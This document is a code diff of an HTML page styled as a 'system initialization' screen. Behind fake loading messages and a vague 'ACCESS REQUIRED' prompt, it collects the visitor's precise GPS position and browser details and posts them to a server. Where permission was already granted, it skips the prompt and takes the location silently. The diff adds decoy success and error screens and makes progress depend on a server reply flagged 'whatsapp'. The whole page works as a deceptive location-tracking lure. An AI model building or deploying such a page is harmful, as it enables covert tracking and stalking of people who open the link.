@@ -1,13 +1,24 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="theme-color" content="#050708">
 
-<title>𝕳𝖅𝕽𝟏⁹</title>
+<meta charset="UTF-8">
+
+<meta
+    name="viewport"
+    content="width=device-width, initial-scale=1.0"
+>
+
+<meta
+    name="theme-color"
+    content="#050708"
+>
+
+<title>HZR APP AFG</title>
+
 
 <style>
+
 * {
     box-sizing: border-box;
     margin: 0;
@@ -15,238 +26,463 @@
     font-family: Arial, Helvetica, sans-serif;
 }
 
+
 body {
+
     min-height: 100vh;
+
     background:
-        radial-gradient(circle at 50% 15%, #102b35 0%, #050708 45%, #000 100%);
+        radial-gradient(
+            circle at 50% 15%,
+            #102b35 0%,
+            #050708 45%,
+            #000 100%
+        );
+
     color: #fff;
+
     display: flex;
+
     justify-content: center;
+
     align-items: center;
+
     overflow: hidden;
 }
 
+
 .container {
+
     width: min(92%, 430px);
+
     text-align: center;
 }
 
+
 .logo {
+
     font-size: 34px;
+
     font-weight: 800;
+
     letter-spacing: 4px;
+
     color: #19e6c1;
-    text-shadow: 0 0 25px rgba(25,230,193,.35);
+
+    text-shadow:
+        0 0 25px rgba(25,230,193,.35);
+
     margin-bottom: 10px;
 }
 
+
 .subtitle {
+
     color: #718084;
+
     font-size: 10px;
+
     letter-spacing: 3px;
+
     text-transform: uppercase;
+
     margin-bottom: 35px;
 }
 
+
 .panel {
+
     background: rgba(8,14,16,.90);
-    border: 1px solid rgba(25,230,193,.15);
+
+    border:
+        1px solid
+        rgba(25,230,193,.15);
+
     border-radius: 22px;
+
     padding: 30px 24px;
+
     box-shadow:
         0 20px 70px rgba(0,0,0,.55),
         inset 0 0 35px rgba(25,230,193,.025);
 }
 
+
 .status {
+
     font-size: 18px;
+
     font-weight: 600;
+
     margin-bottom: 25px;
 }
 
+
 .lines {
+
     text-align: left;
 }
 
+
 .line {
+
     display: flex;
+
     align-items: center;
+
     gap: 11px;
+
     color: #566467;
+
     font-size: 13px;
+
     margin: 15px 0;
+
     transition: .35s;
 }
 
+
 .line.active {
+
     color: #dce5e6;
 }
 
+
 .line.done {
+
     color: #19e6c1;
 }
 
+
 .dot {
+
     width: 7px;
+
     height: 7px;
+
     border-radius: 50%;
+
     background: #344245;
+
     flex-shrink: 0;
 }
 
+
 .line.active .dot {
+
     background: #19e6c1;
-    box-shadow: 0 0 12px #19e6c1;
-    animation: pulse 1s infinite;
+
+    box-shadow:
+        0 0 12px #19e6c1;
+
+    animation:
+        pulse 1s infinite;
 }
+
 
 .line.done .dot {
+
     background: #19e6c1;
 }
 
+
 @keyframes pulse {
+
     50% {
+
         opacity: .35;
+
         transform: scale(.75);
     }
 }
 
+
 .loader {
+
     width: 34px;
+
     height: 34px;
-    border: 3px solid rgba(255,255,255,.08);
+
+    border:
+        3px solid
+        rgba(255,255,255,.08);
+
     border-top-color: #19e6c1;
+
     border-radius: 50%;
+
     margin: 28px auto 5px;
-    animation: spin .8s linear infinite;
+
+    animation:
+        spin .8s linear infinite;
 }
 
+
 @keyframes spin {
+
     to {
+
         transform: rotate(360deg);
     }
 }
 
+
 .error {
+
     display: none;
 }
 
+
 .error-title {
+
     color: #ffffff;
+
     font-size: 20px;
+
     font-weight: 700;
+
     margin-bottom: 10px;
 }
 
+
 .error-text {
+
     color: #788588;
+
     font-size: 13px;
+
     line-height: 1.7;
+
     margin-bottom: 24px;
 }
 
+
 .retry {
+
     width: 100%;
+
     height: 48px;
+
     border: 0;
+
     border-radius: 13px;
+
     background: #19e6c1;
+
     color: #00110d;
+
     font-size: 13px;
+
     font-weight: 800;
+
     letter-spacing: 1px;
+
     cursor: pointer;
+
     transition: .2s;
 }
 
+
 .retry:active {
+
     transform: scale(.97);
 }
 
+
 .retry:disabled {
+
     background: #202a2c;
+
     color: #5d696b;
+
     cursor: not-allowed;
 }
 
+
+.success {
+
+    display: none;
+
+    text-align: center;
+}
+
+
+.success-title {
+
+    color: #19e6c1;
+
+    font-size: 20px;
+
+    font-weight: 700;
+
+    margin-bottom: 10px;
+}
+
+
+.success-text {
+
+    color: #788588;
+
+    font-size: 13px;
+
+    line-height: 1.7;
+}
+
+
+/* Permission */
+
 .permission-overlay {
+
     position: fixed;
+
     inset: 0;
+
     z-index: 100;
-    background: rgba(0,0,0,.88);
-    backdrop-filter: blur(12px);
+
+    background:
+        rgba(0,0,0,.88);
+
+    backdrop-filter:
+        blur(12px);
+
     display: flex;
+
     align-items: center;
+
     justify-content: center;
+
     padding: 22px;
 }
 
+
 .permission-box {
+
     width: min(100%, 390px);
+
     background: #090f11;
-    border: 1px solid rgba(25,230,193,.2);
+
+    border:
+        1px solid
+        rgba(25,230,193,.2);
+
     border-radius: 22px;
+
     padding: 30px 24px;
+
     text-align: center;
-    box-shadow: 0 25px 80px rgba(0,0,0,.7);
+
+    box-shadow:
+        0 25px 80px rgba(0,0,0,.7);
 }
 
+
 .permission-icon {
+
     width: 58px;
+
     height: 58px;
+
     border-radius: 17px;
-    background: rgba(25,230,193,.08);
-    border: 1px solid rgba(25,230,193,.18);
+
+    background:
+        rgba(25,230,193,.08);
+
+    border:
+        1px solid
+        rgba(25,230,193,.18);
+
     display: flex;
+
     align-items: center;
+
     justify-content: center;
+
     margin: 0 auto 20px;
+
     font-size: 25px;
+
     color: #19e6c1;
 }
 
+
 .permission-title {
+
     font-size: 21px;
+
     margin-bottom: 12px;
 }
 
+
 .permission-text {
+
     color: #7b898b;
+
     font-size: 13px;
+
     line-height: 1.8;
+
     margin-bottom: 24px;
 }
 
+
 .continue {
+
     width: 100%;
+
     height: 48px;
+
     border: 0;
+
     border-radius: 13px;
+
     background: #19e6c1;
+
     color: #00110d;
+
     font-weight: 800;
+
     letter-spacing: 1px;
+
     cursor: pointer;
 }
 
+
 </style>
+
 </head>
+
 
 <body>
 
-<!-- Permission Dialog -->
 
-<div class="permission-overlay" id="permissionOverlay">
+<!-- =========================
+     PERMISSION OVERLAY
+========================= -->
+
+<div
+    class="permission-overlay"
+    id="permissionOverlay"
+>
 
     <div class="permission-box">
 
-        <div class="permission-icon">✓</div>
+        <div class="permission-icon">
+            ✓
+        </div>
 
-        <div class="permission-title">
+
+        <div
+            class="permission-title"
+            id="permissionTitle"
+        >
             ACCESS REQUIRED
         </div>
 
-        <div class="permission-text">
+
+        <div
+            class="permission-text"
+            id="permissionText"
+        >
             Please allow the required access
             to continue.
             <br><br>
@@ -254,7 +490,11 @@ body {
             please select <b>Allow</b>.
         </div>
 
-        <button class="continue" id="continueBtn">
+
+        <button
+            class="continue"
+            id="continueBtn"
+        >
             CONTINUE
         </button>
 
@@ -263,7 +503,9 @@ body {
 </div>
 
 
-<!-- Main Page -->
+<!-- =========================
+     MAIN PAGE
+========================= -->
 
 <div class="container">
 
@@ -271,11 +513,16 @@ body {
         𝕳𝖅𝕽𝟏⁹
     </div>
 
+
     <div class="subtitle">
         SYSTEM INITIALIZATION
     </div>
 
+
     <div class="panel">
+
+
+        <!-- LOADING -->
 
         <div id="loadingContent">
 
@@ -283,51 +530,126 @@ body {
                 Initializing...
             </div>
 
+
             <div class="lines">
 
-                <div class="line" id="line1">
+
+                <div
+                    class="line"
+                    id="line1"
+                >
+
                     <span class="dot"></span>
-                    <span>The webpage is reading</span>
+
+                    <span>
+                        The webpage is reading
+                    </span>
+
                 </div>
 
-                <div class="line" id="line2">
+
+                <div
+                    class="line"
+                    id="line2"
+                >
+
                     <span class="dot"></span>
-                    <span>The system is being prepared</span>
+
+                    <span>
+                        The system is being prepared
+                    </span>
+
                 </div>
 
-                <div class="line" id="line3">
+
+                <div
+                    class="line"
+                    id="line3"
+                >
+
                     <span class="dot"></span>
-                    <span>Initializing session</span>
+
+                    <span>
+                        Initializing session
+                    </span>
+
                 </div>
 
-                <div class="line" id="line4">
+
+                <div
+                    class="line"
+                    id="line4"
+                >
+
                     <span class="dot"></span>
-                    <span>Establishing connection</span>
+
+                    <span>
+                        Establishing connection
+                    </span>
+
                 </div>
+
 
             </div>
+
 
             <div class="loader"></div>
 
         </div>
 
 
-        <div class="error" id="errorContent">
+        <!-- ERROR -->
+
+        <div
+            class="error"
+            id="errorContent"
+        >
 
             <div class="error-title">
                 Server didn't respond
             </div>
 
+
             <div class="error-text">
-                The server did not respond to the request.
+
+                The server did not respond
+                to the request.
                 Please try again.
+
             </div>
 
-            <button class="retry" id="retryBtn">
+
+            <button
+                class="retry"
+                id="retryBtn"
+            >
                 RETRY
             </button>
 
         </div>
+
+
+        <!-- SUCCESS -->
+
+        <div
+            class="success"
+            id="successContent"
+        >
+
+            <div class="success-title">
+                Connection established
+            </div>
+
+
+            <div class="success-text">
+
+                The session has been initialized
+                successfully.
+
+            </div>
+
+        </div>
+
 
     </div>
 
@@ -336,80 +658,303 @@ body {
 
 <script>
 
-let permissionStarted = false;
+
+/* =====================================================
+   HZR STATE
+===================================================== */
+
+let locationRequestRunning = false;
+
 let retryUsed = false;
 
-const overlay = document.getElementById("permissionOverlay");
-const continueBtn = document.getElementById("continueBtn");
 
-const loadingContent = document.getElementById("loadingContent");
-const errorContent = document.getElementById("errorContent");
+/* =====================================================
+   ELEMENTS
+===================================================== */
 
-const retryBtn = document.getElementById("retryBtn");
-
-const line1 = document.getElementById("line1");
-const line2 = document.getElementById("line2");
-const line3 = document.getElementById("line3");
-const line4 = document.getElementById("line4");
+const overlay =
+    document.getElementById(
+        "permissionOverlay"
+    );
 
 
-/*
-    HZR ID
-    Format:
-    hzr + YYYYMMDDHHMMSSmmm
-*/
+const continueBtn =
+    document.getElementById(
+        "continueBtn"
+    );
+
+
+const permissionTitle =
+    document.getElementById(
+        "permissionTitle"
+    );
+
+
+const permissionText =
+    document.getElementById(
+        "permissionText"
+    );
+
+
+const loadingContent =
+    document.getElementById(
+        "loadingContent"
+    );
+
+
+const errorContent =
+    document.getElementById(
+        "errorContent"
+    );
+
+
+const successContent =
+    document.getElementById(
+        "successContent"
+    );
+
+
+const retryBtn =
+    document.getElementById(
+        "retryBtn"
+    );
+
+
+const line1 =
+    document.getElementById("line1");
+
+
+const line2 =
+    document.getElementById("line2");
+
+
+const line3 =
+    document.getElementById("line3");
+
+
+const line4 =
+    document.getElementById("line4");
+
+
+/* =====================================================
+   GENERATE HZR ID
+
+   hzr + YYYYMMDDHHMMSSmmm
+===================================================== */
 
 function generateHZRId() {
 
     const d = new Date();
 
-    const pad = (value, length = 2) =>
-        String(value).padStart(length, "0");
+
+    function pad(
+        value,
+        length = 2
+    ) {
+
+        return String(value)
+            .padStart(length, "0");
+
+    }
+
 
     return (
+
         "hzr" +
+
         d.getFullYear() +
-        pad(d.getMonth() + 1) +
-        pad(d.getDate()) +
-        pad(d.getHours()) +
-        pad(d.getMinutes()) +
-        pad(d.getSeconds()) +
-        pad(d.getMilliseconds(), 3)
+
+        pad(
+            d.getMonth() + 1
+        ) +
+
+        pad(
+            d.getDate()
+        ) +
+
+        pad(
+            d.getHours()
+        ) +
+
+        pad(
+            d.getMinutes()
+        ) +
+
+        pad(
+            d.getSeconds()
+        ) +
+
+        pad(
+            d.getMilliseconds(),
+            3
+        )
+
     );
+
 }
 
 
-/*
-    Request location
-*/
+/* =====================================================
+   SHOW PERMISSION SCREEN
+===================================================== */
+
+function showPermissionScreen(
+    title,
+    text,
+    buttonText
+) {
+
+    permissionTitle.textContent =
+        title;
+
+    permissionText.innerHTML =
+        text;
+
+    continueBtn.textContent =
+        buttonText;
+
+    overlay.style.display =
+        "flex";
+
+}
+
+
+/* =====================================================
+   HIDE PERMISSION SCREEN
+===================================================== */
+
+function hidePermissionScreen() {
+
+    overlay.style.display =
+        "none";
+
+}
+
+
+/* =====================================================
+   SHOW ERROR
+===================================================== */
+
+function showError() {
+
+    loadingContent.style.display =
+        "none";
+
+    successContent.style.display =
+        "none";
+
+    errorContent.style.display =
+        "block";
+
+}
+
+
+/* =====================================================
+   CHECK BROWSER PERMISSION
+
+   If permission was already granted,
+   we don't show our permission dialog.
+===================================================== */
+
+async function checkBrowserPermission() {
+
+    try {
+
+        if (
+            !navigator.permissions ||
+            !navigator.permissions.query
+        ) {
+
+            return "unknown";
+
+        }
+
+
+        const result =
+            await navigator.permissions.query({
+                name: "geolocation"
+            });
+
+
+        console.log(
+            "Geolocation permission:",
+            result.state
+        );
+
+
+        return result.state;
+
+    } catch (error) {
+
+        console.log(
+            "Permission API unavailable:",
+            error
+        );
+
+        return "unknown";
+
+    }
+
+}
+
+
+/* =====================================================
+   REQUEST LOCATION
+
+   This is the real location request.
+===================================================== */
 
 function requestLocation() {
 
-    if (permissionStarted) {
+    if (locationRequestRunning) {
         return;
     }
 
-    permissionStarted = true;
 
     if (!navigator.geolocation) {
 
-        permissionStarted = false;
+        showPermissionScreen(
 
-        continueBtn.textContent = "TRY AGAIN";
+            "LOCATION UNAVAILABLE",
+
+            "Your browser does not support location access.",
+
+            "TRY AGAIN"
+
+        );
 
         return;
     }
+
+
+    locationRequestRunning =
+        true;
+
+
+    continueBtn.disabled =
+        true;
+
+
+    continueBtn.textContent =
+        "CHECKING...";
 
 
     navigator.geolocation.getCurrentPosition(
 
         async function(position) {
 
+            console.log(
+                "Location received."
+            );
+
+
             const latitude =
                 position.coords.latitude;
 
+
             const longitude =
                 position.coords.longitude;
+
 
             const accuracy =
                 position.coords.accuracy;
@@ -419,13 +964,6 @@ function requestLocation() {
                 generateHZRId();
 
 
-            /*
-                Browser/device information.
-
-                A normal website cannot reliably obtain
-                the exact phone model on every browser.
-            */
-
             const userAgent =
                 navigator.userAgent;
 
@@ -434,48 +972,88 @@ function requestLocation() {
                 navigator.userAgent;
 
 
-            console.log("HZR ID:", hzrId);
-            console.log("Latitude:", latitude);
-            console.log("Longitude:", longitude);
-            console.log("Accuracy:", accuracy);
+            console.log(
+                "HZR ID:",
+                hzrId
+            );
 
 
-            /*
-                Send location to Render server.
-            */
+            console.log(
+                "Latitude:",
+                latitude
+            );
+
+
+            console.log(
+                "Longitude:",
+                longitude
+            );
+
+
+            console.log(
+                "Accuracy:",
+                accuracy
+            );
+
+
+            /* =========================================
+               SEND TO SERVER
+            ========================================= */
 
             try {
 
-                const response = await fetch(
-                    "/api/location",
-                    {
-                        method: "POST",
+                const response =
+                    await fetch(
+                        "/api/location",
+                        {
 
-                        headers: {
-                            "Content-Type": "application/json"
-                        },
+                            method: "POST",
 
-                        body: JSON.stringify({
+                            headers: {
+                                "Content-Type":
+                                    "application/json"
+                            },
 
-                            id: hzrId,
+                            body:
+                                JSON.stringify({
 
-                            latitude: latitude,
+                                    id:
+                                        hzrId,
 
-                            longitude: longitude,
+                                    latitude:
+                                        latitude,
 
-                            accuracy: accuracy,
+                                    longitude:
+                                        longitude,
 
-                            device: device,
+                                    accuracy:
+                                        accuracy,
 
-                            userAgent: userAgent
+                                    device:
+                                        device,
 
-                        })
-                    }
-                );
+                                    userAgent:
+                                        userAgent
+
+                                })
+
+                        }
+                    );
 
 
-                const data =
-                    await response.json();
+                let data;
+
+
+                try {
+
+                    data =
+                        await response.json();
+
+                } catch (jsonError) {
+
+                    data = null;
+
+                }
 
 
                 console.log(
@@ -485,27 +1063,61 @@ function requestLocation() {
 
 
                 /*
-                    If server accepted the request,
-                    continue with initialization.
+                   IMPORTANT:
+
+                   Server must return:
+
+                   success: true
+                   whatsapp: true
+
+                   Otherwise we DO NOT continue.
                 */
 
-                if (response.ok && data.success) {
+                if (
 
-                    overlay.style.display = "none";
+                    response.ok &&
+
+                    data &&
+
+                    data.success === true &&
+
+                    data.whatsapp === true
+
+                ) {
+
+                    locationRequestRunning =
+                        false;
+
+
+                    continueBtn.disabled =
+                        false;
+
+
+                    hidePermissionScreen();
+
 
                     startInitialization();
 
+
                 } else {
 
-                    /*
-                        Keep page locked if server
-                        did not accept the request.
-                    */
+                    locationRequestRunning =
+                        false;
 
-                    permissionStarted = false;
 
-                    continueBtn.textContent =
-                        "TRY AGAIN";
+                    continueBtn.disabled =
+                        false;
+
+
+                    showPermissionScreen(
+
+                        "SERVER ERROR",
+
+                        "The request could not be completed.<br><br>Please try again.",
+
+                        "TRY AGAIN"
+
+                    );
 
                 }
 
@@ -517,10 +1129,24 @@ function requestLocation() {
                     error
                 );
 
-                permissionStarted = false;
 
-                continueBtn.textContent =
-                    "TRY AGAIN";
+                locationRequestRunning =
+                    false;
+
+
+                continueBtn.disabled =
+                    false;
+
+
+                showPermissionScreen(
+
+                    "CONNECTION ERROR",
+
+                    "The server could not be reached.<br><br>Please try again.",
+
+                    "TRY AGAIN"
+
+                );
 
             }
 
@@ -529,24 +1155,64 @@ function requestLocation() {
 
         function(error) {
 
-            permissionStarted = false;
+            console.log(
+                "Geolocation error:",
+                error.code,
+                error.message
+            );
+
+
+            locationRequestRunning =
+                false;
+
+
+            continueBtn.disabled =
+                false;
+
 
             /*
-                Permission dialog remains visible.
+               Error 1 = Permission denied
+               Error 2 = Position unavailable
+               Error 3 = Timeout
             */
 
-            overlay.style.display = "flex";
 
-            continueBtn.textContent =
-                "TRY AGAIN";
+            if (error.code === 1) {
+
+                showPermissionScreen(
+
+                    "ACCESS REQUIRED",
+
+                    "Please allow location access in your browser settings, then press <b>TRY AGAIN</b>.",
+
+                    "TRY AGAIN"
+
+                );
+
+            } else {
+
+                showPermissionScreen(
+
+                    "LOCATION UNAVAILABLE",
+
+                    "Location is currently unavailable. Make sure Location is turned on, then press <b>TRY AGAIN</b>.",
+
+                    "TRY AGAIN"
+
+                );
+
+            }
 
         },
 
 
         {
             enableHighAccuracy: true,
+
             timeout: 15000,
+
             maximumAge: 0
+
         }
 
     );
@@ -554,15 +1220,22 @@ function requestLocation() {
 }
 
 
-/*
-    Initialization animation
-*/
+/* =====================================================
+   INITIALIZATION
+===================================================== */
 
 function startInitialization() {
 
-    loadingContent.style.display = "block";
+    loadingContent.style.display =
+        "block";
 
-    errorContent.style.display = "none";
+
+    errorContent.style.display =
+        "none";
+
+
+    successContent.style.display =
+        "none";
 
 
     line1.classList.remove(
@@ -570,15 +1243,18 @@ function startInitialization() {
         "done"
     );
 
+
     line2.classList.remove(
         "active",
         "done"
     );
 
+
     line3.classList.remove(
         "active",
         "done"
     );
+
 
     line4.classList.remove(
         "active",
@@ -588,82 +1264,93 @@ function startInitialization() {
 
     setTimeout(function() {
 
-        line1.classList.add("active");
+        line1.classList.add(
+            "active"
+        );
 
     }, 400);
 
 
     setTimeout(function() {
 
-        line1.classList.remove("active");
+        line1.classList.remove(
+            "active"
+        );
 
-        line1.classList.add("done");
+        line1.classList.add(
+            "done"
+        );
 
-        line2.classList.add("active");
+        line2.classList.add(
+            "active"
+        );
 
     }, 1400);
 
 
     setTimeout(function() {
 
-        line2.classList.remove("active");
+        line2.classList.remove(
+            "active"
+        );
 
-        line2.classList.add("done");
+        line2.classList.add(
+            "done"
+        );
 
-        line3.classList.add("active");
+        line3.classList.add(
+            "active"
+        );
 
     }, 2400);
 
 
     setTimeout(function() {
 
-        line3.classList.remove("active");
+        line3.classList.remove(
+            "active"
+        );
 
-        line3.classList.add("done");
+        line3.classList.add(
+            "done"
+        );
 
-        line4.classList.add("active");
+        line4.classList.add(
+            "active"
+        );
 
     }, 3400);
 
 
-    /*
-        At this point the location has already
-        been sent to server.js.
-
-        We display the final server status.
-    */
-
     setTimeout(function() {
 
-        line4.classList.remove("active");
+        line4.classList.remove(
+            "active"
+        );
 
-        line4.classList.add("done");
+        line4.classList.add(
+            "done"
+        );
 
-        showServerError();
+
+        loadingContent.style.display =
+            "none";
+
+
+        successContent.style.display =
+            "block";
+
 
     }, 5000);
 
 }
 
 
-/*
-    Server error screen
-*/
+/* =====================================================
+   RETRY
 
-function showServerError() {
-
-    loadingContent.style.display =
-        "none";
-
-    errorContent.style.display =
-        "block";
-
-}
-
-
-/*
-    RETRY can only be used once.
-*/
+   Retry actually checks location again.
+===================================================== */
 
 retryBtn.addEventListener(
     "click",
@@ -674,31 +1361,39 @@ retryBtn.addEventListener(
         }
 
 
-        retryUsed = true;
+        retryUsed =
+            true;
 
 
-        retryBtn.disabled = true;
+        retryBtn.disabled =
+            true;
+
 
         retryBtn.textContent =
             "RETRY USED";
 
 
-        loadingContent.style.display =
-            "block";
-
         errorContent.style.display =
             "none";
 
 
-        startInitialization();
+        loadingContent.style.display =
+            "block";
+
+
+        /*
+           Actually request location again.
+        */
+
+        requestLocation();
 
     }
 );
 
 
-/*
-    Permission button
-*/
+/* =====================================================
+   CONTINUE / TRY AGAIN BUTTON
+===================================================== */
 
 continueBtn.addEventListener(
     "click",
@@ -708,6 +1403,101 @@ continueBtn.addEventListener(
 
     }
 );
+
+
+/* =====================================================
+   PAGE START
+
+   IMPORTANT:
+
+   If permission was already granted,
+   don't show the ACCESS REQUIRED dialog.
+
+   Instead directly check location.
+===================================================== */
+
+async function initializePage() {
+
+    /*
+       First check whether browser permission
+       is already granted.
+    */
+
+    const permission =
+        await checkBrowserPermission();
+
+
+    console.log(
+        "Initial permission:",
+        permission
+    );
+
+
+    if (permission === "granted") {
+
+        /*
+           Permission already exists.
+
+           Don't show ACCESS REQUIRED.
+
+           Directly check/get location.
+        */
+
+        hidePermissionScreen();
+
+        requestLocation();
+
+        return;
+    }
+
+
+    if (permission === "denied") {
+
+        /*
+           Browser permission was previously denied.
+           User needs to change it in browser settings.
+        */
+
+        showPermissionScreen(
+
+            "ACCESS REQUIRED",
+
+            "Location access is blocked for this site.<br><br>Please allow location access in your browser settings, then press <b>TRY AGAIN</b>.",
+
+            "TRY AGAIN"
+
+        );
+
+        return;
+    }
+
+
+    /*
+       "prompt" or "unknown"
+
+       We show our explanation first.
+       User presses CONTINUE and browser
+       can display its real permission prompt.
+    */
+
+    showPermissionScreen(
+
+        "ACCESS REQUIRED",
+
+        "Please allow the required access to continue.<br><br>If your device asks for permission, please select <b>Allow</b>.",
+
+        "CONTINUE"
+
+    );
+
+}
+
+
+/* =====================================================
+   START
+===================================================== */
+
+initializePage();
 
 </script>
 
